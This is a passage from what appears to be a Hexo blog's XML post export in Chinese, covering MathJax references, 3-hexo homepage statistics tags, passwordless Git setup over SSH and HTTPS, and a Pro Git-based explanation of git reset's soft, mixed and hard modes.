<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://masikkk.com/article/hexo-13-MathJax/">Hexo博客(13)添加MathJax数学公式渲染</a><br><a href="http://www.jianshu.com/p/7ab21c7f0674">在Hexo中渲染MathJax数学公式</a><br><a href="https://math.meta.stackexchange.com/questions/5020/mathjax-basic-tutorial-and-quick-reference">MathJax basic tutorial and quick reference</a></p>
]]></content>
      <categories>
        <category>yelog</category>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>mathjax</tag>
      </tags>
  </entry>
  <entry>
    <title>3-hexo配置首页</title>
    <url>//3-hexo-homepage</url>
    <content><![CDATA[<p>今日将首页提到md文件中了，方便大家的更改。</p>
<p>首页文件位置 /layout/indexs.md ，既然是md格式，要怎么写大家应该都熟门熟路了，阿杰就不赘述了。</p>
<p>如果需要使用以下信息，可以按照下面的方式使用（<strong>以下内容不限首页使用</strong>）</p>
<h2 id="文章数统计-字数统计"><a href="#文章数统计-字数统计" class="headerlink" title="文章数统计/字数统计"></a>文章数统计/字数统计</h2><p>加入含有 <code>class=&quot;article_number&quot;</code>的html标签可显示文章数量。<br>加入含有 <code>class=&quot;site_word_count&quot;</code>的html标签可显示站点总字数。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 我这里是借用了code的样式，所以直接使用code标签。</span></span><br><span class="line"><span class="comment">    自定义样式，可加入style属性设置--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">code</span> <span class="attr">class</span>=<span class="string">&quot;article_number&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">code</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">code</span> <span class="attr">class</span>=<span class="string">&quot;site_word_count&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">code</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>上面代码的效果：</strong><br>文章：<code class="article_number"></code>篇；总字数：<code class="site_word_count"></code>字；</p>
<h2 id="流量统计"><a href="#流量统计" class="headerlink" title="流量统计"></a>流量统计</h2><blockquote>
<p>日志： 2017-03-18改动，由原来的 id 改为现在的 class，可在页面添加多个同类标签</p>
</blockquote>
<p>加入含有 <code>class=&quot;site_uv&quot;</code>的html标签可显示站点访问人次。<br>加入含有 <code>class=&quot;site_pv&quot;</code>的html标签可显示站点访问量。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 我这里是借用了code的样式，所以直接使用code标签。</span></span><br><span class="line"><span class="comment">    自定义样式，可加入style属性设置--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">code</span> <span class="attr">class</span>=<span class="string">&quot;site_uv&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">code</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">code</span> <span class="attr">class</span>=<span class="string">&quot;site_pv&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">code</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>上面代码的效果：</strong><br>访问人数：<code class="site_uv"></code>人，访问量：<code class="site_pv"></code>次。</p>
]]></content>
      <categories>
        <category>yelog</category>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>hexo</tag>
        <tag>3-hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>Git之SSH与HTTPS免密码配置</title>
    <url>//Git-SSH-HTTPS-verify-configuration</url>
    <content><![CDATA[<p>Git作为当前最受欢迎的版本控制软件，使用是很频繁的。但每次使用git push等操作时都要输入密码，实在是挺麻烦的。本文对使用ssh与https两种通讯协议讨论一下免密码配置。<br>注：这个过程在所有操作系统上都是相似的：）</p>
<span id="more"></span>
<h2 id="SSH通信协议"><a href="#SSH通信协议" class="headerlink" title="SSH通信协议"></a>SSH通信协议</h2><h3 id="GitHub版"><a href="#GitHub版" class="headerlink" title="GitHub版"></a>GitHub版</h3><p>许多Git服务器都使用SSH公钥进行认证，当然也包括github。<br>首先你需要确认一下自己是否已经拥有密钥了，默认情况下，用户的 SSH 密钥存储在其 <code>~/.ssh</code> 目录下。进入该目录并列出其中内容，你变可以下快速确认自己是否已经拥有密钥：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> ~/.ssh</span><br><span class="line">$ ls</span><br><span class="line">authorized_keys2  id_rsa       known_hosts</span><br><span class="line">config            id_rsa.pub</span><br></pre></td></tr></table></figure>
<p>我们需要寻找一对 <code>id_rsa</code> 或 <code>id_dsa</code> 命名的文件，其中一个带 <code>.pub</code> 扩展名。 ‘.pub’文件是你的公钥，另一个则是私钥。如果没有找不到这样的文件（或者根本就没有<code>.ssh</code>目录），我们可以通过 <code>ssh-keygen</code> 程序来创建它们。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#邮箱可以随便填</span></span><br><span class="line">$ ssh-keygen -t rsa -C <span class="string">&quot;xx@xx.com&quot;</span></span><br></pre></td></tr></table></figure>
<p>首先 <code>ssh-keygen</code> 会确认密钥的存储位置和文件名（默认是 <code>.ssh/id_rsa</code>）,然后他会要求你输入两次密钥口令，留空即可。所以一般选用默认，全部回车即可。</p>
<p>接下来我们登陆到GitHub上，右上角小头像-&gt;Setting-&gt;SSH and GPG keys中，点击new SSH key。<br><code>Title：</code>可以随便填写，但最好起的名字能让自己知道这个公钥是哪个设备的。<br><code>Key：</code>将上面生成的<code>.pub</code>文件中的所有内容复制到这里。<br>点击下面的Add SSH key即可。<br>然后你就会发现可以免密码访问了</p>
<h3 id="Git服务器"><a href="#Git服务器" class="headerlink" title="Git服务器"></a>Git服务器</h3><p>如果服务端是自己搭建的git服务器，生成密钥公钥对的步骤是一样的。<br>然后将生成的 <code>.pub</code> 文件内容，导入到git服务器 <code>/home/git/.ssh/authorized_keys</code> 文件内，一行一个。<br>然后你就会发现git push 不再需要密码了<br>搭建git服务器和相关免登陆的详细步骤可参考我的另一篇 <a href="#">Post not found: set-up-git-server-on-vps</a></p>
<h2 id="HTTPS通信协议"><a href="#HTTPS通信协议" class="headerlink" title="HTTPS通信协议"></a>HTTPS通信协议</h2><p>上面讲了SSH方式的免密码，接下来讲一下越来越常用的HTTPS方式的免密码<br>新建文件并保存密码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ touch ~/.git-credentials</span><br><span class="line">$ vim ~/.git-credentials</span><br></pre></td></tr></table></figure>
<p>添加内容</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">https://&#123;username&#125;:&#123;passwd&#125;@github.com</span><br></pre></td></tr></table></figure>
<p>添加git配置</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git config --global credential.helper store</span><br></pre></td></tr></table></figure>
<p>查看～/.gitconfig文件变化</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">[credential]</span><br><span class="line">    helper = store</span><br></pre></td></tr></table></figure>
<p>然后再尝试一下git push不再在需要密码了</p>
]]></content>
      <categories>
        <category>yelog</category>
        <category>工具</category>
      </categories>
      <tags>
        <tag>Git</tag>
      </tags>
  </entry>
  <entry>
    <title>Git之reset揭秘</title>
    <url>//git-reset</url>
    <content><![CDATA[<p>本文主要选自于《Pro Git》这本书，加上自己平时使用时的理解整理于此，以此给大家借鉴。<br>本文主要讨论 <code>reset</code> 与 <code>checkout</code>。它们能做很多事情，所以我们要真正理解他们到底在底层做了哪些工作，以便能够恰当的运用它们。</p>
<span id="more"></span>
<h2 id="三棵树"><a href="#三棵树" class="headerlink" title="三棵树"></a>三棵树</h2><p>理解 <code>reset</code> 和 <code>checkout</code> 的最简方法，就是以 Git 的思维框架（将其作为内容管理器）来管理三棵不同的树。 “树” 在我们这里的实际意思是 “文件的集合”，而不是指特定的数据结构。 （在某些情况下索引看起来并不像一棵树，不过我们现在的目的是用简单的方式思考它。）</p>
<table>
<thead>
<tr>
<th align="left">树</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">HEAD</td>
<td align="left">上一次提交的快照，下一次提交的父结点</td>
</tr>
<tr>
<td align="left">Index</td>
<td align="left">预期的下一次提交的快照</td>
</tr>
<tr>
<td align="left">Working Directory</td>
<td align="left">沙盒</td>
</tr>
</tbody></table>
<h2 id="HEAD"><a href="#HEAD" class="headerlink" title="HEAD"></a>HEAD</h2><p>HEAD 是当前分支引用的指针，它总是指向该分支上的最后一次提交。 这表示 HEAD 将是下一次提交的父结点。 通常，理解 HEAD 的最简方式，就是将它看做 <strong>你的上一次提交</strong> 的快照。</p>
<p>其实，查看快照的样子很容易。 下例就显示了 HEAD 快照实际的目录列表，以及其中每个文件的 SHA-1 校验和：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git cat-file -p HEAD</span><br><span class="line">tree cfda3bf379e4f8dba8717dee55aab78aef7f4daf</span><br><span class="line">author Scott Chacon  1301511835 -0700</span><br><span class="line">committer Scott Chacon  1301511835 -0700</span><br><span class="line"></span><br><span class="line">initial commit</span><br><span class="line"></span><br><span class="line">$ git ls-tree -r HEAD</span><br><span class="line">100644 blob a906cb2a4a904a152...   README</span><br><span class="line">100644 blob 8f94139338f9404f2...   Rakefile</span><br><span class="line">040000 tree 99f1a6d12cb4b6f19...   lib</span><br></pre></td></tr></table></figure>
<p><code>cat-file</code> 与 <code>ls-tree</code> 是底层命令，它们一般用于底层工作，在日常工作中并不使用。不过它们能帮助我们了解到底发生了什么。</p>
<h2 id="索引-Index"><a href="#索引-Index" class="headerlink" title="索引(Index)"></a>索引(Index)</h2><p>索引是你的 <strong>预期的下一次提交</strong>。 我们也会将这个概念引用为 Git 的 “暂存区域”，这就是当你运行 <code>git commit</code> 时 Git 看起来的样子。</p>
<p>Git 将上一次检出到工作目录中的所有文件填充到索引区，它们看起来就像最初被检出时的样子。 之后你会将其中一些文件替换为新版本，接着通过 git commit 将它们转换为树来用作新的提交。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git ls-files -s</span><br><span class="line">100644 a906cb2a4a904a152e80877d4088654daad0c859 0	README</span><br><span class="line">100644 8f94139338f9404f26296befa88755fc2598c289 0	Rakefile</span><br><span class="line">100644 47c6340d6459e05787f644c2447d2595f5d3a54b 0	lib/simplegit.rb</span><br></pre></td></tr></table></figure>

<p>再说一次，我们在这里又用到了 <code>ls-files</code> 这个幕后的命令，它会显示出索引当前的样子。</p>
<p>确切来说，索引并非技术上的树结构，它其实是以扁平的清单实现的。不过对我们而言，把它当做树就够了。</p>
<h2 id="工作目录-Working-Directory"><a href="#工作目录-Working-Directory" class="headerlink" title="工作目录(Working Directory)"></a>工作目录(Working Directory)</h2><p>最后，你就有了自己的工作目录。 另外两棵树以一种高效但并不直观的方式，将它们的内容存储在 <code>.git</code> 文件夹中。 工作目录会将它们解包为实际的文件以便编辑。 你可以把工作目录当做 <strong>沙盒</strong>。在你将修改提交到暂存区并记录到历史之前，可以随意更改。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ tree</span><br><span class="line">.</span><br><span class="line">├── README</span><br><span class="line">├── Rakefile</span><br><span class="line">└── lib</span><br><span class="line">    └── simplegit.rb</span><br><span class="line"></span><br><span class="line">1 directory, 3 files</span><br></pre></td></tr></table></figure>

<h2 id="工作流程"><a href="#工作流程" class="headerlink" title="工作流程"></a>工作流程</h2><p>Git 主要的目的是通过操纵这三棵树来以更加连续的状态记录项目的快照。<br><img src="http://img.saodiyang.com/FuPJ7H7NQ32SfOF8kjbnzLk6vmEH.png" class="lazyload" data-srcset="http://img.saodiyang.com/FuPJ7H7NQ32SfOF8kjbnzLk6vmEH.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="工作流程"><br>让我们来可视化这个过程：假设我们进入到一个新目录，其中有一个文件。 我们称其为该文件的 <strong>v1</strong> 版本，将它标记为蓝色。 现在运行 <code>git init</code>，这会创建一个 Git 仓库，其中的 HEAD 引用指向未创建的分支（<code>master</code> 还不存在）。<br><img src="http://img.saodiyang.com/FrD7WIEaHU-3MqVa7jIeHVh_j2sf.png" class="lazyload" data-srcset="http://img.saodiyang.com/FrD7WIEaHU-3MqVa7jIeHVh_j2sf.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="git初始化情况"><br>此时，只有工作目录有内容。</p>
<p>现在我们想要提交这个文件，所以用 <code>git add</code> 来获取工作目录中的内容，并将其复制到索引中。<br><img src="http://img.saodiyang.com/Fqoqvx7xoY0Ok-U_dSUNdPcrk43t.png" class="lazyload" data-srcset="http://img.saodiyang.com/Fqoqvx7xoY0Ok-U_dSUNdPcrk43t.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="git add之后情况"><br>接着运行 <code>git commit</code>，它首先会移除索引中的内容并将它保存为一个永久的快照，然后创建一个指向该快照的提交对象，最后更新 <code>master</code> 来指向本次提交。<br><img src="http://img.saodiyang.com/FqPDbSnfFD3LM_3-tSY7OLwtCGSa.png" class="lazyload" data-srcset="http://img.saodiyang.com/FqPDbSnfFD3LM_3-tSY7OLwtCGSa.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="git commit之后情况"><br>此时如果我们运行 <code>git status</code>，会发现没有任何改动，因为现在三棵树完全相同。</p>
<p>现在我们想要对文件进行修改然后提交它。 我们将会经历同样的过程；首先在工作目录中修改文件。 我们称其为该文件的 <strong>v2</strong> 版本，并将它标记为红色。<br><img src="http://img.saodiyang.com/FoJPPHbaxpKomYmGALsLPgg1NlbZ.png" class="lazyload" data-srcset="http://img.saodiyang.com/FoJPPHbaxpKomYmGALsLPgg1NlbZ.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="编辑文件"><br>如果现在运行 <code>git status</code>，我们会看到文件显示在 “Changes not staged for commit,” 下面并被标记为红色，因为该条目在索引与工作目录之间存在不同。 接着我们运行 <code>git add</code> 来将它暂存到索引中。<br><img src="http://img.saodiyang.com/FuF8tzqKZfm6enCohAFGL5rSY8pR.png" class="lazyload" data-srcset="http://img.saodiyang.com/FuF8tzqKZfm6enCohAFGL5rSY8pR.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="git add之后情况"><br>此时，由于索引和 HEAD 不同，若运行 <code>git status</code> 的话就会看到 “Changes to be committed” 下的该文件变为绿色 ——也就是说，现在预期的下一次提交与上一次提交不同。 最后，我们运行 <code>git commit</code> 来完成提交。<br><img src="http://img.saodiyang.com/Fvsca5WLZmAr_ApYX3-dHk312zw8.png" class="lazyload" data-srcset="http://img.saodiyang.com/Fvsca5WLZmAr_ApYX3-dHk312zw8.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="git add之后情况"><br>现在运行 <code>git status</code> 会没有输出，因为三棵树又变得相同了。</p>
<p>切换分支或克隆的过程也类似。 当检出一个分支时，它会修改 <strong>HEAD</strong> 指向新的分支引用，将 <strong>索引</strong> 填充为该次提交的快照，然后将 <strong>索引</strong> 的内容复制到 工作目录 中。</p>
<h2 id="重置的作用"><a href="#重置的作用" class="headerlink" title="重置的作用"></a>重置的作用</h2><p>在以下情景中观察 <code>reset</code> 命令会更有意义。</p>
<p>为了演示这些例子，假设我们再次修改了 <code>file.txt</code> 文件并第三次提交它。 现在的历史看起来是这样的：<br><img src="http://img.saodiyang.com/Ft27dwjZotq0XD5tYdVqc7tq-ibP.png" class="lazyload" data-srcset="http://img.saodiyang.com/Ft27dwjZotq0XD5tYdVqc7tq-ibP.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="><br>让我们跟着 <code>reset</code> 看看它都做了什么。 它以一种简单可预见的方式直接操纵这三棵树。 它做了三个基本操作。</p>
<h3 id="1-移动-HEAD"><a href="#1-移动-HEAD" class="headerlink" title="1.移动 HEAD"></a>1.移动 HEAD</h3><p><code>reset</code> 做的第一件事是移动 HEAD 的指向。 这与改变 HEAD 自身不同（<code>checkout</code> 所做的）；<code>reset</code> 移动 HEAD 指向的分支。 这意味着如果 HEAD 设置为 <code>master</code> 分支（例如，你正在 <code>master</code> 分支上），运行 <code>git reset 9e5e64a</code> 将会使 <code>master</code> 指向 <code>9e5e64a</code>。<br><img src="http://img.saodiyang.com/FnlCclgtQ-6JbFSLYJ5aOzZCY7Re.png" class="lazyload" data-srcset="http://img.saodiyang.com/FnlCclgtQ-6JbFSLYJ5aOzZCY7Re.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="git reset --soft"><br>无论你调用了何种形式的带有一个提交的 <code>reset</code>，它首先都会尝试这样做。 使用 <code>reset --soft</code>，它将仅仅停在那儿。</p>
<p>现在看一眼上图，理解一下发生的事情：它本质上是撤销了上一次 <code>git commit</code> 命令。 当你在运行 <code>git commit</code> 时，Git 会创建一个新的提交，并移动 HEAD 所指向的分支来使其指向该提交。 当你将它 <code>reset</code> 回 <code>HEAD~</code>（HEAD 的父结点）时，其实就是把该分支移动回原来的位置，而不会改变索引和工作目录。 现在你可以更新索引并再次运行 <code>git commit</code> 来完成 <code>git commit --amend</code> 所要做的事情了。</p>
<h3 id="2-更新索引-–mixed"><a href="#2-更新索引-–mixed" class="headerlink" title="2.更新索引(–mixed)"></a>2.更新索引(–mixed)</h3><p>注意，如果你现在运行 <code>git status</code> 的话，就会看到新的 HEAD 和以绿色标出的它和索引之间的区别。</p>
<p>接下来，<code>reset</code> 会用 HEAD 指向的当前快照的内容来更新索引。<br><img src="http://img.saodiyang.com/Fp_egv7ERkdtOGOcillcEgBnvFh7.png" class="lazyload" data-srcset="http://img.saodiyang.com/Fp_egv7ERkdtOGOcillcEgBnvFh7.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="git reset --mixed"><br>如果指定 <code>--mixed</code> 选项，<code>reset</code> 将会在这时停止。 这也是默认行为，所以如果没有指定任何选项（在本例中只是 <code>git reset HEAD~</code>），这就是命令将会停止的地方。</p>
<p>现在再看一眼上图，理解一下发生的事情：它依然会撤销一上次 提交，但还会 取消暂存 所有的东西。 于是，我们回滚到了所有 <code>git add</code> 和 <code>git commit</code> 的命令执行之前。</p>
<h3 id="3-更新工作目录"><a href="#3-更新工作目录" class="headerlink" title="3.更新工作目录"></a>3.更新工作目录</h3><p><code>reset</code> 要做的的第三件事情就是让工作目录看起来像索引。 如果使用 –hard 选项，它将会继续这一步。<br><img src="http://img.saodiyang.com/FisVYp5vIOXZTy1w9t_NPBcHdr8h.png" class="lazyload" data-srcset="http://img.saodiyang.com/FisVYp5vIOXZTy1w9t_NPBcHdr8h.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="git reset --hard"><br>现在让我们回想一下刚才发生的事情。 你撤销了最后的提交、<code>git add</code> 和 <code>git commit</code> 命令以及工作目录中的所有工作。</p>
<p>必须注意，<code>--hard</code> 标记是 <code>reset</code> 命令唯一的危险用法，它也是 Git 会真正地销毁数据的仅有的几个操作之一。 其他任何形式的 reset 调用都可以轻松撤消，但是 <code>--hard</code> 选项不能，因为它强制覆盖了工作目录中的文件。 在这种特殊情况下，我们的 Git 数据库中的一个提交内还留有该文件的 <strong>v3</strong> 版本，我们可以通过 <code>reflog</code> 来找回它。但是若该文件还未提交，Git 仍会覆盖它从而导致无法恢复。</p>
<h3 id="回顾"><a href="#回顾" class="headerlink" title="回顾"></a>回顾</h3><p>reset 命令会以特定的顺序重写这三棵树，在你指定以下选项时停止：</p>
<ol>
<li>移动 HEAD 分支的指向 （若指定了 <code>--soft</code>，则到此停止）</li>
<li>使索引看起来像 HEAD （不带参数或 <code>--mixed</code>，则到此停止）</li>
<li>使工作目录看起来像索引 (指定了 <code>--hard</code>)</li>
</ol>
<h3 id="通过路径来重置"><a href="#通过路径来重置" class="headerlink" title="通过路径来重置"></a>通过路径来重置</h3><p>前面讲述了 <code>reset</code> 基本形式的行为，不过你还可以给它提供一个作用路径。 若指定了一个路径，<code>reset</code> 将会跳过第 1 步，并且将它的作用范围限定为指定的文件或文件集合。 这样做自然有它的道理，因为 HEAD 只是一个指针，你无法让它同时指向两个提交中各自的一部分。 不过索引和工作目录 可以部分更新，所以重置会继续进行第 2、3 步。</p>
<p>现在，假如我们运行 <code>git reset file.txt</code> （这其实是 <code>git reset --mixed HEAD file.txt</code> 的简写形式，因为你既没有指定一个提交的 SHA-1 或分支，也没有指定 <code>--soft</code> 或 <code>--hard</code>），它会：</p>
<ol>
<li>移动 HEAD 分支的指向 （已跳过）</li>
<li>让索引看起来像 HEAD （到此处停止）</li>
</ol>
<p>所以它本质上只是将 <code>file.txt</code> 从 HEAD 复制到索引中。<br><img src="http://img.saodiyang.com/FnXU5yA8N-Xjt7dTPqD0U6ZuNmkf.png" class="lazyload" data-srcset="http://img.saodiyang.com/FnXU5yA8N-Xjt7dTPqD0U6ZuNmkf.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="git reset"><br>它还有 <em>取消暂存文件</em> 的实际效果。 如果我们查看该命令的示意图，然后再想想 <code>git add</code> 所做的事，就会发现它们正好相反。<br><img src="http://img.saodiyang.com/FsgUtPndZWzdhH1uYJLmX6ts7k99.png" class="lazyload" data-srcset="http://img.saodiyang.com/FsgUtPndZWzdhH1uYJLmX6ts7k99.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="git add"></p>
<p>这就是为什么 <code>git status</code> 命令的输出会建议运行此命令来取消暂存一个文件。 （查看 取消暂存的文件 来了解更多。）</p>
<p>我们可以不让 Git 从 HEAD 拉取数据，而是通过具体指定一个提交来拉取该文件的对应版本。 我们只需运行类似于 <code>git reset eb43bf file.txt</code> 的命令即可。<br><img src="http://img.saodiyang.com/Fp5Cq3mjN7l3br62FjGcBfvXIy2b.png" class="lazyload" data-srcset="http://img.saodiyang.com/Fp5Cq3mjN7l3br62FjGcBfvXIy2b.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="git reset eb43 -- file.txt"><br>它其实做了同样的事情，也就是把工作目录中的文件恢复到 <strong>v1</strong> 版本，运行 <code>git add</code> 添加它，然后再将它恢复到 <strong>v3</strong> 版本（只是不用真的过一遍这些步骤）。 如果我们现在运行 <code>git commit</code>，它就会记录一条“将该文件恢复到 <strong>v1</strong> 版本”的更改，尽管我们并未在工作目录中真正地再次拥有它。</p>
<p>还有一点同 <code>git add</code> 一样，就是 <code>reset</code> 命令也可以接受一个 <code>--patch</code> 选项来一块一块地取消暂存的内容。 这样你就可以根据选择来取消暂存或恢复内容了。</p>
<h3 id="压缩"><a href="#压缩" class="headerlink" title="压缩"></a>压缩</h3><p>我们来看看如何利用这种新的功能来做一些有趣的事情 - 压缩提交。</p>
<p>假设你的一系列提交信息中有 “oops.”、“WIP” 和 “forgot this file”， 聪明的你就能使用 <code>reset</code> 来轻松快速地将它们压缩成单个提交，也显出你的聪明。 （压缩提交 展示了另一种方式，不过在本例中用 <code>reset</code> 更简单。）</p>
<p>假设你有一个项目，第一次提交中有一个文件，第二次提交增加了一个新的文件并修改了第一个文件，第三次提交再次修改了第一个文件。 由于第二次提交是一个未完成的工作，因此你想要压缩它。<br><img src="http://img.saodiyang.com/Ft27dwjZotq0XD5tYdVqc7tq-ibP.png" class="lazyload" data-srcset="http://img.saodiyang.com/Ft27dwjZotq0XD5tYdVqc7tq-ibP.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="git reset --hard"><br>那么可以运行 <code>git reset --soft HEAD~2</code> 来将 HEAD 分支移动到一个旧一点的提交上（即你想要保留的第一个提交）：<br><img src="http://img.saodiyang.com/Fmv1H8vky1f0AnvlQmFFVphIn5ae.png" class="lazyload" data-srcset="http://img.saodiyang.com/Fmv1H8vky1f0AnvlQmFFVphIn5ae.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="git reset --soft HEAD~2"><br>然后只需再次运行 <code>git commit</code>：<br><img src="http://img.saodiyang.com/FgODKQfa32czRawEZ64luzMM3TRa.png" class="lazyload" data-srcset="http://img.saodiyang.com/FgODKQfa32czRawEZ64luzMM3TRa.png" 